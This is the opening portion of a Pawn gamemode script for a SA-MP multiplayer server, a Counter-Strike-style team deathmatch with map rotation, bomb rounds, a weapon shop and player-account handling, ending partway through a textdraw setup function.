// Amir_Unix


#include <a_samp>
#include <a_npc>
#include <sscanf2>
#include <zcmd>
#include <streamer>
#include <dini>
//..//
#define 							MAX_MAPS    6
#define                             SCM         SendClientMessage
#define			 					cpath  		"/clans/stats.ini"
#define                             apath       "/number.ini"
#define winner_money 10000
#define IP_LIMIT 2
#define SAME_IP_CONNECT 4
#define MAX_ZONES 15
#define admin? PlayerInfo[playerid][pAdmin] > 1
#define Time_Limit 3500
#define ARMEDBODY_USE_HEAVY_WEAPON			(false)
#define DIALOG_REGISTER 1
#define DIALOG_LOGIN 2
#define DIALOG_SUCCESS_1 3
#define DIALOG_SUCCESS_2 4
#define DIALOG_WEAPON 10024
#define DIACOIN 2020
#define DIALOG_REGISTER1 10001
#define DIALOG_REGISTER2 1
#define DIALOG_REGISTER3 2
#define DIALOG_REGISTER4 3
#define DIALOG_LOGIN1 10006
#define DIALOG_NOPW1 10002
#define DIALOG_NOPW2 10003
#define DIALOG_WRONGPW 10004
#define DIALOG_SPAWN_CLASS 1000
#define DIALOG_GUNS 1024

#define PATH "/Users/%s.ini"

#define dcmd(%1,%2,%3) if (!strcmp((%3)[1], #%1, true, (%2)) && ((((%3)[(%2) + 1] == '\0') && (dcmd_%1(playerid, ""))) || (((%3)[(%2) + 1] == ' ') && (dcmd_%1(playerid, (%3)[(%2) + 2]))))) return 1

#define PRESSED(%0) \
	(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
//colors
#define COLOR_GREY 0xAFAFAFAA
#define COLOR_GREEN 0x33AA33AA
#define COLOR_RED 0xAA3333AA
#define COLOR_YELLOW 0xFFFF00AA
#define COLOR_WHITE 0xFFFFFFAA
#define COLOR_BLUE 0x0000BBAA
#define COLOR_LIGHTBLUE 0x33CCFFAA
#define COLOR_ORANGE 0xFF9900AA
#define COLOR_RED 0xAA3333AA
#define COLOR_LIME 0x10F441AA
#define COLOR_MAGENTA 0xFF00FFFF
#define COLOR_NAVY 0x000080AA
#define COLOR_AQUA 0xF0F8FFAA
#define COLOR_CRIMSON 0xDC143CAA
#define COLOR_FLBLUE 0x6495EDAA
#define COLOR_BISQUE 0xFFE4C4AA
#define COLOR_BLACK 0x000000AA
#define COLOR_CHARTREUSE 0x7FFF00AA
#define COLOR_BROWN 0XA52A2AAA
#define COLOR_CORAL 0xFF7F50AA
#define COLOR_GOLD 0xB8860BAA
#define COLOR_GREENYELLOW 0xADFF2FAA
#define COLOR_INDIGO 0x4B00B0AA
#define COLOR_IVORY 0xFFFF82AA
#define COLOR_LAWNGREEN 0x7CFC00AA
#define COLOR_SEAGREEN 0x20B2AAAA
#define COLOR_LIMEGREEN 0x32CD32AA
#define COLOR_MIDNIGHTBLUE 0X191970AA
#define COLOR_MAROON 0x800000AA
#define COLOR_OLIVE 0x808000AA
#define COLOR_ORANGERED 0xFF4500AA
#define COLOR_PINK 0xFFC0CBAA
#define COLOR_SPRINGGREEN 0x00FF7FAA
#define COLOR_TOMATO 0xFF6347AA
#define COLOR_YELLOWGREEN 0x9ACD32AA
#define COLOR_MEDIUMAQUA 0x83BFBFAA
#define COLOR_MEDIUMMAGENTA 0x8B008BAA
#define COL_WHITE "{FFFFFF}"
#define COL_RED "{F81414}"
#define COL_GREEN "{00FF22}"
#define COL_LIGHTBLUE "{00CED1}"
#define Grey 0xC0C0C0F
#define colorSPECTATE       0xffffffff
#define UZI_PRICE  			(180000)
#define UZI_AMMO  			(400)
#define TEC9_PRICE  		(155000)
#define TEC9_AMMO  			(400)
#define Deagle_PRICE  		(50000)
#define Deagle_AMMO  		(400)
#define S9mm_PRICE  		(55000)
#define S9mm_AMMO  			(400)
#define P9mm_PRICE  		(62000)
#define P9mm_AMMO  			(400)
#define Swanoff_PRICE  		(222000)
#define Swanoff_AMMO  		(400)
#define Combat_PRICE  		(180000)
#define Combat_AMMO  		(400)
#define M4_PRICE  			(130000)
#define M4_AMMO  			(300)
#define AK47_PRICE  		(130000)
#define AK47_AMMO  			(300)
#define Sniper_PRICE  		(142000)
#define Sniper_AMMO  		(400)
#define Country_PRICE  		(146000)
#define Country_AMMO  		(400)
#define Grenade_PRICE  		(20000)
#define Grenade_AMMO 		(40)
#define Molotov_PRICE  		(30000)
#define Molotov_AMMO 		(40)
#define Knife_PRICE  		(10000)
#define Knife_AMMO  		(1)
#define Teargas_PRICE  		(24000)
#define Teargas_AMMO  		(40)

//..//
new Vehicle[MAX_PLAYERS];
new bool:bedamjetpack[MAX_PLAYERS];
new reg[MAX_PLAYERS];
new g_Object[100];
new gzones[5];
new JetPack[MAX_PLAYERS];
static tick = 0;
new Same_IP=0,Join_Stamp,ban_s[25],exceed=0;
new CommandCount[MAX_PLAYERS], AntiCmdSpamTimer[MAX_PLAYERS];
new bool:realcash[MAX_PLAYERS] = false;
new SpectatedPlayer[MAX_PLAYERS];
new bool:IsPlayerSpectating[MAX_PLAYERS];
new nps[MAX_PLAYERS];
new cp[MAX_PLAYERS];
new prt[MAX_PLAYERS];
new bool:muted[MAX_PLAYERS];
new String[128], Float:SpecX[MAX_PLAYERS], Float:SpecY[MAX_PLAYERS], Float:SpecZ[MAX_PLAYERS], vWorld[MAX_PLAYERS], Inter[MAX_PLAYERS];
new IsSpecing[MAX_PLAYERS], pName[MAX_PLAYER_NAME], IsBeingSpeced[MAX_PLAYERS],spectatorid[MAX_PLAYERS];
new Text:Don;
new Text: KillerTextdraw[MAX_PLAYERS], Text:KillerTextdraw1[MAX_PLAYERS], Text:KillerTextdraw2[MAX_PLAYERS];
new FirstPerson[MAX_PLAYERS];
new FirstPersonObject[MAX_PLAYERS];
new bool:FPS[MAX_PLAYERS];
new ponykey = 99999;
new g_Actor[3];
new BombTimer;
new gteam[MAX_PLAYERS];
new pbomb[MAX_PLAYERS];
new  BombPlanted = 0;
new bool:isplayerspawn[MAX_PLAYERS] = false;
new BombPlaced;
new OldMoney[MAX_PLAYERS];
new NewMoney[MAX_PLAYERS];
new g_Vehicle[100];
new g_Pickup[5];
new MapChange;
new JailTimer[MAX_PLAYERS];
new Jailed[MAX_PLAYERS];
new bool: isRelogging[MAX_PLAYERS], relogPlayerIP[MAX_PLAYERS][17];
new DropLimit = 4;
new DeleteTime = 20;
new IsGunSelection[MAX_PLAYERS];
new bool:Upgrade[MAX_PLAYERS];
// txd
new Text:Textdrawt;
new Text:Textdrawa;
new Text:Textdrawb;
new Text:Textdrawc;
new Text:Textdrawd;
new Text:Textdrawe;
new Text:Textdraw5;
new Text:Textdraw6;
new Text:Textdraw7;
new Text:Textdraw8;
new Text:Textdraw9;
new Text:Textdraw10;
new Text:bg;
new Text:Textdraw12;
new Text:Textdraw13;
new Text:Textdraw14;
new Text:Textdraw15;
new Text:Textdraw16;
new Text:Textdraw17;
new Text:Textdraw18;
new Text:Textdraw19;
new Text:Textdraw20;
new Text:Textdraw21;
new Text:Textdraw22;
new Text:Amar1;
new Text:Amar2;
new Text:Amar3;
new Amar1Text[300];
new Amar2Text[300];
new Amar3Text[300];
new Text:tdw0;
new Text:tdw1;
new Text:tdw2;
new Text:tdw3;
new Text:tdw4;
new Text:tdw5;
new Text:tdw6;
new Text:tdw7;
new Text:tdw8;
new Text:tdg;
new Text:tdn;
new Text:tdrw0;
new Text:tdrw1;
new Text:tdrw2;
new PlayerText:Textdraw0[MAX_PLAYERS];
new PlayerText:td1[MAX_PLAYERS];
new PlayerText:td2[MAX_PLAYERS];
new PlayerText:td3[MAX_PLAYERS];
new PlayerText:td4[MAX_PLAYERS];
new PlayerText:td5[MAX_PLAYERS];
new PlayerText:td6[MAX_PLAYERS];
new PlayerText:td7[MAX_PLAYERS];
new PlayerText:td8[MAX_PLAYERS];
new PlayerText:td9[MAX_PLAYERS];
new PlayerText:td10[MAX_PLAYERS];
new PlayerText:td11[MAX_PLAYERS];
new PlayerText:td12[MAX_PLAYERS];
new PlayerText:td13[MAX_PLAYERS];
new PlayerText:td14[MAX_PLAYERS];
new PlayerText:td15[MAX_PLAYERS];
new PlayerText:td16[MAX_PLAYERS];
new PlayerText:td17[MAX_PLAYERS];
new PlayerText:td18[MAX_PLAYERS];
new PlayerText:td19[MAX_PLAYERS];
new PlayerText:td20[MAX_PLAYERS];
new PlayerText:td21[MAX_PLAYERS];
new PlayerText:td22[MAX_PLAYERS];
new PlayerText:td23[MAX_PLAYERS];
new PlayerText:td24[MAX_PLAYERS];
new Text:Gunstxd[14];
new PlayerText:aklevel[MAX_PLAYERS];
new PlayerText:m4level[MAX_PLAYERS];
new PlayerText:snipelevel[MAX_PLAYERS];
new PlayerText:mp5level[MAX_PLAYERS];
new PlayerText:shotgunlevel[MAX_PLAYERS];
new PlayerText:sawnlevel[MAX_PLAYERS];
new PlayerText:aktxd[MAX_PLAYERS];
new PlayerText:m4txd[MAX_PLAYERS];
new PlayerText:snipetxd[MAX_PLAYERS];
new PlayerText:mp5txd[MAX_PLAYERS];
new PlayerText:sgtxd[MAX_PLAYERS];
new PlayerText:sawntxd[MAX_PLAYERS];
new PlayerText:buytxd[MAX_PLAYERS];
new PlayerText:close[MAX_PLAYERS];
//fwd
forward ps(playerid);
forward dmp();
forward dok(playerid);
forward	hideshoptxd(playerid);
forward shoptxd(p);
forward okload(playerid);
forward loadtimer(playerid);
forward bombblow();
forward SendMSG();
forward Unmute(playerid);
forward StartedNewRound();
forward NewMapTimer(playerid);
forward killall(wt);
forward defuse(playerid);
forward blowbomb();
forward GetWeaponModel(weaponid);
forward ChangeColor();
forward SendClientMessageToNearPlayers(playerid,text[]);
forward bebakhashkhodamano();
forward attachweapon(playerid);
forward dos(playerid);
forward hd(playerid);
forward loadtxd(playerid);
//---
enum gInfo
{
	cName,
	cTag[256],
	cMembers,
	cLeader,
	cSlot,
	cMember,
	cRank[128],
	cRank1[128],
	cRank2[128],
	cRank3[128],
	cRank4[128],
	cNumbers
}
new GroupInfo[MAX_PLAYERS][gInfo];
enum pInfo
{
    pPass[1000],
    pCash,
    pAdmin,
    pKills,
    pDeaths,
    pVip,
    pScore,
    pTala,
    pLog,
    pClan,
    pRank,
    pDrugs,
    pAk,
    pM4,
    pSnipe,
    pMp5,
    pShotgun,
    pSawn
}
new PlayerInfo[MAX_PLAYERS][pInfo];
stock UserPath(playerid)
{
    new string[128],playername[MAX_PLAYER_NAME];
    GetPlayerName(playerid,playername,sizeof(playername));
    format(string,sizeof(string),PATH,playername);
    return string;
}
stock udb_hash(buf[]) {
	new length=strlen(buf);
    new s1 = 1;
    new s2 = 0;
    new n;
    for (n=0; n<length; n++)
    {
       s1 = (s1 + buf[n]) % 65521;
       s2 = (s2 + s1)     % 65521;
    }
     new msg[256];
			 format(msg,sizeof(msg),"%d",((s2 << 16) + s1));
			
    return msg;
}

stock GetRanomPlayer()
{
	new PlayerList[MAX_PLAYERS], Count;
	for (new i; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i))
		{
			if(gteam[i] == 2){
			PlayerList[Count] = i;
			Count++;
			}
		}
	}
	return PlayerList[random(Count)];
}

stock GivePlayerBomb()
{
new rand = GetRanomPlayer();
pbomb[rand] = 1;
SendClientMessage(rand, 1, "{1AFF00}Bomb C4 {FFFFFF}was given to you!");
}
stock soundall(yt)
{
	for (new i; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i))
		{
			if(yt == 1)
			  PlayAudioStreamForPlayer(i,"http://soundfxcenter.com/video-games/counter-strike/8d82b5_Counter_Strike_Bomb_Has_Been_Planted_Sound_Effect.mp3");
	 if(yt == 2)PlayAudioStreamForPlayer(i,"https://www.myinstants.com/media/sounds/8e8118_counter_strike_go_go_go_sound_effect.mp3");
		if(yt == 3) PlayAudioStreamForPlayer(i,"https://www.myinstants.com/media/sounds/the-bomb-has-been-defused-sound-xpaw3.mp3");
		}
	}
}
stock isterroristwin()
{
new count;
new count1;
for (new i; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i))
		{
		if(isplayerspawn[i] == true && gteam[i] == 1)
		{

        count++;
		}
		 if(isplayerspawn[i] == true && gteam[i] == 2)
		 {
			count1++;
		 }
		}
	}
	if(count == 0){
	if(MapChange == 0) return GameTextForAll("~r~Terrorist ~g~Win",2500,1);
	if(MapChange == 1) return  GameTextForAll("~r~Zombies ~g~Win",2500,1);
    if(MapChange == 2) return GameTextForAll("~r~Sniper-Team2 ~g~Win",2500,1);
    if(MapChange == 3) return GameTextForAll("~r~Isis ~g~Win",2500,1);
    else GameTextForAll("~r~Team-2 ~g~Win",2500,1);
    
	 return true;}
	 if(count1 == 0){
	 if(MapChange == 0) return GameTextForAll("~b~Counter Terrorist ~g~Win",2500,1);
	if(MapChange == 1) return  GameTextForAll("~b~Human ~g~Win",2500,1);
    if(MapChange == 2) return GameTextForAll("~b~Sniper-Team1 ~g~Win",2500,1);
    if(MapChange == 3) return GameTextForAll("~b~Taliban ~g~Win",2500,1);
    else GameTextForAll("~r~Team-1 ~g~Win",2500,1);return true;}
	else return false;
}
public bombblow()
{
     new Float:x,Float:y,Float:z;
    GetObjectPos(BombPlaced,x,y,z);
    CreateExplosion(x,y,z,2,10.50);
    CreateExplosion(x,y,z,6,10.50);
    CreateExplosion(x,y,z,7,10.50);
    CreateExplosion(x,y,z,13,10.50);
    CreateExplosion(x,y,z,9,10.50);
    CreateExplosion(x,y,z,3,10.50);
    CreateExplosion(x,y,z,4,10.50);
    CreateExplosion(x,y,z,5,10.50);
    CreateExplosion(x,y,z,0,10.50);
    CreateExplosion(x,y,z,10,10.50);
    DestroyObject(BombPlaced);
    killall(1);
    roundend();


    return 1;
}
stock respawnall()
{
for (new i; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i))
		{
	   SpawnPlayer(i);
		}
	}
}
public Unmute(playerid)
{
muted[playerid] = false;
SendClientMessage(playerid, COLOR_RED, "Shoma Be Sorat Khodkar Unmute Shodid");
return 1;
}
stock roundend()
{
if(isterroristwin())
	{
	respawnall();
	if(MapChange == 0)
		GivePlayerBomb();
			BombPlanted = 0;
			soundall(2);
	}
	return 1;
}
//killteam
killall(wt)
{
for (new i; i < MAX_PLAYERS; i++)
	{

		if (IsPlayerConnected(i))
		{
			if(wt == 1 && gteam[i] == 1)
	   SetPlayerHealth(i,0);
	   else if(wt == 2 &&  gteam[i] == 2)
	   SetPlayerHealth(i,0);
		}
	}
}
//weather
stock SetAllWeather(weather)
{
   for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerWeather(i, weather);
}
//weaponspickup
forward DeletePickup(pickupid);
forward DropPlayerWeapons(playerid);
public DropPlayerWeapons(playerid)
{
    new playerweapons[13][2];
    new Float:x,Float:y,Float:z;
    GetPlayerPos(playerid, x, y, z);

	for(new i=0; i<13; i++)
	{
    	GetPlayerWeaponData(playerid, i, playerweapons[i][0], playerweapons[i][1]);
    	new model = GetWeaponType(playerweapons[i][0]);
		new times = floatround(playerweapons[i][1]/10.0001);
    	new Float:X = x + (random(3) - random(3));
    	new Float:Y = y + (random(3) - random(3));
    	if(playerweapons[i][1] != 0 && model != -1)
		{
		    if(times > DropLimit) times = DropLimit;
	    	for(new a=0; a<times; a++)
			{
				new pickupid = CreatePickup(model, 3, X, Y, z);
				SetTimerEx("DeletePickup", DeleteTime*1000, false, "d", pickupid);
			}
		}
	}
	return 1;
}
stock SendMessageToAdmins(text[])
{
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(PlayerInfo[i][pAdmin] > 0)
        {
            SendClientMessage(i, COLOR_LIME, text);
        }
    }
}
public DeletePickup(pickupid)
{
	DestroyPickup(pickupid);
	return 1;
}
GetWeaponType(weaponid)
{
	switch(weaponid)
	{
	    case 1: return 331; case 2: return 333; case 3: return 334; 
		case 4: return 335; case 5: return 336; case 6: return 337;
		case 7: return 338; case 8: return 339; case 9: return 341;
		case 10: return 321; case 11: return 322; case 12: return 323;
		case 13: return 324; case 14: return 325; case 15: return 326;
		case 16: return 342; case 17: return 343; case 18: return 344;
		case 22: return 346; case 23: return 347; case 24: return 348;
		case 25: return 349; case 26: return 350; case 27: return 351;
		case 28: return 352; case 29: return 353; case 30: return 355;
		case 31: return 356; case 32: return 372; case 33: return 357;
		case 34: return 358; case 35: return 359; case 36: return 360;
		case 37: return 361; case 38: return 362; case 39: return 363;
		case 41: return 365; case 42: return 366; case 46: return 371; 
	}
	return -1;
}
//sppex
stock SetPlayerPosEx(playerid, Float:x ,Float:y,Float:z,Float:a,interior,vw)
{
    SetPlayerPos(playerid , x , y ,z);
    SetPlayerFacingAngle(playerid, a);
    SetPlayerInterior(playerid, interior);
    SetPlayerVirtualWorld(playerid, vw);
    return 1;
}
//weapattach
stock GetWeaponModel(weaponid)
{
	switch(weaponid)
	{
	    case 1:
	        return 331;

		case 2..8:
		    return weaponid+331;

        case 9:
		    return 341;

		case 10..15:
			return weaponid+311;

		case 16..18:
		    return weaponid+326;

		case 22..29:
		    return weaponid+324;

		case 30,31:
		    return weaponid+325;

		case 32:
		    return 372;

		case 33..45:
		    return weaponid+324;

		case 46:
		    return 371;
	}
	return 0;
}

//endweapattach
//maptimer
public NewMapTimer(playerid)                      
{
    MapChange++;                                  
    GameTextForAll("~b~ Loading new ~w~Game",4000,3);
    SendRconCommand("hostname [JG]-IR_TDM-[TDM]: Map Changing...");
    SetTimer("StartedNewRound",2000,false);
    return 1;
}
//---
public StartedNewRound()                          
{
	if (MapChange == MAX_MAPS) MapChange = 0;
    for(new i = 0; i < MAX_PLAYERS; i++) {        
    SetPlayerHealth(i,0);
	ForceClassSelection(i);                        
        switch ( MapChange ) {                    
            case 0:
            {
            TextDrawSetString(Textdrawt,"cs-1.6");
                SendRconCommand("hostname [JG]-IR_TDM-[TDM]: de_Dust2");
                SendClientMessage(i,-1,"New MapLoaded");
                JetPack[i] = 0;
            }
            case 1:
            {
            TextDrawSetString(Textdrawt,"Zombie");
                 SendRconCommand("hostname [JG]-IR_TDM-[TDM]: Zombie_DM");
                SendClientMessage(i,-1,"New GameLoaded");
                SetWorldTime(00);
                 SetAllWeather(15);
                
            }
            case 2:
			{
			SetWorldTime(10);
                 SetAllWeather(1);
                  TextDrawSetString(Textdrawt,"Sniper_Map");
                 SendRconCommand("hostname [JG]-IR_TDM-[TDM]: Sniper_DM");
                SendClientMessage(i,-1,"New GameLoaded");
			}
			case 3:
			{
                  TextDrawSetString(Textdrawt,"IvT-Map");
                 SendRconCommand("hostname [JG]-IR_TDM-[TDM]: I_v_T");
                SendClientMessage(i,-1,"New GamepLoaded");
                
			}
			case 4:
			{
                  TextDrawSetString(Textdrawt,"PRT-Map");
                 SendRconCommand("hostname [JG]-IR_TDM-[TDM]: Prototype");
                SendClientMessage(i,-1,"New GameLoaded");
			}
			case 5:
			{
			    TextDrawSetString(Textdrawt,"PRT-Map");
                 SendRconCommand("hostname [JG]-IR_TDM-[TDM]: JP_DM");
                  SendClientMessage(i,-1,"New GameLoaded");
                  JetPack[i] = 1;
			}
            default:
			{
                 SendRconCommand("hostname [JG]-IR_TDM-[TDM]: de_Dust2");
                SendClientMessage(i,-1,"New GameLoaded");MapChange = 0;
			}
        }
    }
    return 1;
}
stock WhoIsDriver(vehicleid)
{
	for(new i = 0; i < MAX_PLAYERS; i++) 
	{
	    if(GetPlayerVehicleID(i) == vehicleid && GetPlayerState(i) == PLAYER_STATE_DRIVER) return i;
  	}
  	return 0;
}
//---
//Radio
stock SendTeamMessage(text[],gteamsender)
{
    for(new w = 0; w < MAX_PLAYERS; w++)
    {
        if(gteam[w] == gteamsender)
        {
            SendClientMessage(w, -1, text);
        }
    }
}
//--fps
stock StartFPS(playerid) 
{
    FirstPersonObject[playerid] = CreateObject(19300, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    AttachObjectToPlayer(FirstPersonObject[playerid],playerid, 0.0, 0.12, 0.7, 0.0, 0.0, 0.0);
    AttachCameraToObject(playerid, FirstPersonObject[playerid]);
    FirstPerson[playerid] = 1;
    CallLocalFunction("OnPlayerHaveFirstPerson", "i", playerid);
    return 1;
}

stock StopFPS(playerid) 
{
    SetCameraBehindPlayer(playerid);
    DestroyObject(FirstPersonObject[playerid]);
    FirstPerson[playerid] = 0;
    CallLocalFunction("OnPlayerDoNotHaveFirstPerson", "i", playerid);
    return 1;
}

stock Reset(playerid)
{
    FirstPerson[playerid] = 0;
}
new Float:Rsin[][4] =
{
    {1715.5897,-1668.5376,20.2255,122.8279},
    {1727.1283,-1659.2101,20.2378,183.3018},
    {1715.5897,-1668.5376,20.2255,122.8279}
    
};
new Float:Rsdct[][4] =
{
    {-1103.6765,2427.1333,127.0128,73.9577},
    {-1088.3693,2430.0864,127.0128,278.4703},
    {-1088.6367,2411.0430,127.0128,194.4962}
    
};
new Float:Rsdt[][4] =
{
    {-1053.8147,2585.9724,141.2628,94.3143},
    {-1058.4709,2605.0891,141.2628,6.2668},
    {-1046.2598,2606.7632,141.2628,268.8191}
    
};
new Float:Rszb[][4] =
{
    {-263.5751,2583.3186,63.5703,263.4457},
    {-263.9518,2591.3362,63.5703,53.5605},
    {-276.5573,2588.5220,63.5703,97.4276}
    
};
new Float:Rsp1[][4] =
{
    {-2624.3328,1337.2968,7.1953,42.1746},
    {-2645.2317,1377.7456,7.1649,245.2165},
    {-2642.8938,1338.6084,7.1552,318.2238}
    
};
new Float:Rsp2[][4] =
{
    {-2092.0581,1433.3560,7.1016,179.9927},
    {-2092.0581,1427.8624,7.1016,179.9927},
    {-2092.0581,1417.8391,7.1007,179.9927}
    
};
new Float:Rszh[][4] =
{
    {-318.3581,2683.1990,62.6394,65.9587},
    {-301.3000,2690.2754,62.6762,255.1903},
    {-289.5596,2654.9739,62.8610,164.9494}
    
};
new Float:Rss1[][4] =
{
    {1867.8280,-1786.9576,389.9453,65.9143},
    {1866.5750,-1763.1353,389.9453,0.1137},
    {1891.8910,-1745.9480,406.2283,347.8465}
    
};
new Float:Rss2[][4] =
{
    {1731.8199,-1803.8586,406.2283,93.1274},
    {1744.4238,-1744.9753,390.1692,287.9991},
    {1736.5068,-1797.3596,390.1692,206.8682}
    
};
new Float:Rsmp5[][4] =
{
    {50.1753,5913.4927,81.9379,268.5058},
    {51.3148,5905.9727,81.9379,285.1126},
    {51.6967,5898.6113,81.9379,265.1059}
    
};
new Float:Rs2mp5[][4] =
{
    {105.4274,5913.9033,81.9379,91.8309},
    {104.5446,5898.2241,81.9379,105.3044},
    {105.4578,5882.2432,81.9379,62.3774}
    
};
new RandomMSG[][] =
{
    " Did you see the hacker? ~b~ /report",
    " do you need help? ~b~ /cmds",
    " First person ~b~ /cfps",
    " Online Admins ~b~/admins ",
    " Random Message ",
    " Random Message"
};
public SendMSG()
{
    new randMSG = random(sizeof(RandomMSG));
    SendAmar(RandomMSG[randMSG]);
    return 1;
}
stock SendAmar(msg[])
{
	format(Amar1Text, sizeof(Amar1Text), Amar2Text);
    format(Amar2Text, sizeof(Amar2Text), Amar3Text);

    TextDrawSetString(Amar1, Amar1Text);
    TextDrawSetString(Amar2, Amar2Text);

    TextDrawSetString(Amar3, msg);

    format(Amar3Text, sizeof(Amar3Text), msg);
	return 1;
}
public ChangeColor() {
	
	tick++;
	static colors[4][4] = {  "~W~", "~Y~", "~B~", "~R~"};
	static first[5] = "I", second[5] = "CS";
	new str[32];
	format(str, sizeof(str), "%s%s%s%s", colors[tick%2], first, colors[(tick%2)+2], second);
	TextDrawSetString(tdg, str);
	return 1;
}
forward GivePlayerMoneyEx(playerid,ammount);
public GivePlayerMoneyEx(playerid,ammount)
{
      
      OldMoney[playerid] = GetPlayerMoney(playerid);
      NewMoney[playerid] = GetPlayerMoney(playerid) + ammount;
      
      GivePlayerMoney(playerid,ammount);

      return 1;
}
forward CheckMoney();
public CheckMoney()
{
      for(new i = 0; i < MAX_PLAYERS; i++)
      {
      
               if(IsPlayerConnected(i))
               {
             
                        if(GetPlayerMoney(i) > NewMoney[i])
                        {
                                  
                                  GivePlayerMoney(i,OldMoney[i]);
                                  
                        }
               }
      }
      return 1;
}
stock GetStampIP(playerid){
        new S_IP[16];
        Join_Stamp=GetTickCount();
        GetPlayerIp(playerid,S_IP,16);
        format(ban_s, 16, "%s", S_IP);
        return 1;
}
forward AntiCommandSpam(playerid);
public AntiCommandSpam(playerid)
{
	if(CommandCount[playerid] >= 15)
	{
		SendClientMessage(playerid, 0xFF0000FF, "You have been kicked from the server. Reason: Command Spam");
		Kick(playerid);
	}
	CommandCount[playerid] = 0;
	return 1;
}

stock ReShowCategory(playerid)
{
	PlayerTextDrawHide(playerid,td20[playerid]);
	PlayerTextDrawHide(playerid,td21[playerid]);
	PlayerTextDrawHide(playerid,td22[playerid]);
	PlayerTextDrawHide(playerid,td23[playerid]);
	PlayerTextDrawHide(playerid,td11[playerid]);
	PlayerTextDrawHide(playerid,td12[playerid]);
	PlayerTextDrawHide(playerid,td13[playerid]);
	PlayerTextDrawHide(playerid,td14[playerid]);
	return 1;
}
stock SendERROR(playerid)
{
    SendClientMessage(playerid,0xFF0000FF,"ERROR » {FFFFFF}You do not have enough money");
    return true;
}
stock PurchaseMSG(playerid,WeaponID)
{
	new string[126],gunname[32];
	GetWeaponName(WeaponID,gunname,sizeof(gunname));
	if(WeaponID == 18) gunname = "Molotov Cocktail";
	format(string,sizeof(string),"{5EFF00}Weapon shop » {FFFFFF}You bought (%s).",gunname);
	SendClientMessage(playerid,-1,string);
	return 1;
}
public hideshoptxd(playerid)
{
PlayerTextDrawDestroy(playerid,Textdraw0[playerid]);
	PlayerTextDrawDestroy(playerid,td1[playerid]);
	PlayerTextDrawDestroy(playerid,td2[playerid]);
	PlayerTextDrawDestroy(playerid,td3[playerid]);
	PlayerTextDrawDestroy(playerid,td4[playerid]);
	PlayerTextDrawDestroy(playerid,td5[playerid]);
	PlayerTextDrawDestroy(playerid,td6[playerid]);
	PlayerTextDrawDestroy(playerid,td7[playerid]);
	PlayerTextDrawDestroy(playerid,td8[playerid]);
	PlayerTextDrawDestroy(playerid,td9[playerid]);
	PlayerTextDrawDestroy(playerid,td10[playerid]);
	PlayerTextDrawDestroy(playerid,td11[playerid]);
	PlayerTextDrawDestroy(playerid,td12[playerid]);
	PlayerTextDrawDestroy(playerid,td13[playerid]);
	PlayerTextDrawDestroy(playerid,td14[playerid]);
	PlayerTextDrawDestroy(playerid,td15[playerid]);
	PlayerTextDrawDestroy(playerid,td16[playerid]);
	PlayerTextDrawDestroy(playerid,td17[playerid]);
	PlayerTextDrawDestroy(playerid,td18[playerid]);
	PlayerTextDrawDestroy(playerid,td19[playerid]);
	PlayerTextDrawDestroy(playerid,td20[playerid]);
	PlayerTextDrawDestroy(playerid,td21[playerid]);
	PlayerTextDrawDestroy(playerid,td22[playerid]);
	PlayerTextDrawDestroy(playerid,td23[playerid]);
	PlayerTextDrawDestroy(playerid,td24[playerid]);
	return 1;
}
public shoptxd(p)
{
Textdraw0[p] = CreatePlayerTextDraw(p, 501.375000, 113.499984, "usebox");
	PlayerTextDrawLetterSize(p, Textdraw0[p], 0.000000, 33.801387);
	PlayerTextDrawTextSize(p, Textdraw0[p], 98.000000, 0.000000);
	PlayerTextDrawAlignment(p, Textdraw0[p], 1);
	PlayerTextDrawColor(p, Textdraw0[p], 0);
	PlayerTextDrawUseBox(p, Textdraw0[p], true);
	PlayerTextDrawBoxColor(p, Textdraw0[p], 102);
	PlayerTextDrawSetShadow(p, Textdraw0[p], 0);
	PlayerTextDrawSetOutline(p, Textdraw0[p], 0);
	PlayerTextDrawFont(p, Textdraw0[p], 0);

	td1[p] = CreatePlayerTextDraw(p, 241.250000, 120.166679, "Shop");
	PlayerTextDrawLetterSize(p, td1[p], 0.449999, 1.600000);
	PlayerTextDrawAlignment(p, td1[p], 1);
	PlayerTextDrawColor(p, td1[p], -225902337);
	PlayerTextDrawSetShadow(p, td1[p], 0);
	PlayerTextDrawSetOutline(p, td1[p], 1);
	PlayerTextDrawBackgroundColor(p, td1[p], 51);
	PlayerTextDrawFont(p, td1[p], 1);
	PlayerTextDrawSetProportional(p, td1[p], 1);

	td2[p] = CreatePlayerTextDraw(p, 208.125000, 131.250000, ".");
	PlayerTextDrawLetterSize(p, td2[p], 15.769989, 0.899999);
	PlayerTextDrawAlignment(p, td2[p], 1);
	PlayerTextDrawColor(p, td2[p], -225902337);
	PlayerTextDrawSetShadow(p, td2[p], 0);
	PlayerTextDrawSetOutline(p, td2[p], 1);
	PlayerTextDrawBackgroundColor(p, td2[p], 51);
	PlayerTextDrawFont(p, td2[p], 1);
	PlayerTextDrawSetProportional(p, td2[p], 1);

	td3[p] = CreatePlayerTextDraw(p, 386.250000, 163.333328, "_");
	PlayerTextDrawLetterSize(p, td3[p], 0.000000, 0.000000);
	PlayerTextDrawTextSize(p, td3[p], 108.125000, 91.583343);
	PlayerTextDrawAlignment(p, td3[p], 1);
	PlayerTextDrawColor(p, td3[p], -1);
	PlayerTextDrawSetShadow(p, td3[p], 0);
	PlayerTextDrawSetOutline(p, td3[p], 0);
	PlayerTextDrawFont(p, td3[p], TEXT_DRAW_FONT_MODEL_PREVIEW);
	PlayerTextDrawSetPreviewModel(p, td3[p], 325135);

	td4[p] = CreatePlayerTextDraw(p, 377.500000, 11.083313, "I");
	PlayerTextDrawLetterSize(p, td4[p], 0.158123, 52.530815);
	PlayerTextDrawAlignment(p, td4[p], 1);
	PlayerTextDrawColor(p, td4[p], -225902337);
	PlayerTextDrawSetShadow(p, td4[p], 0);
	PlayerTextDrawSetOutline(p, td4[p], 1);
	PlayerTextDrawBackgroundColor(p, td4[p], 51);
	PlayerTextDrawFont(p, td4[p], 1);
	PlayerTextDrawSetProportional(p, td4[p], 1);

	td5[p] = CreatePlayerTextDraw(p, 391.875000, 138.833328, "Etela'at Aslahe::");
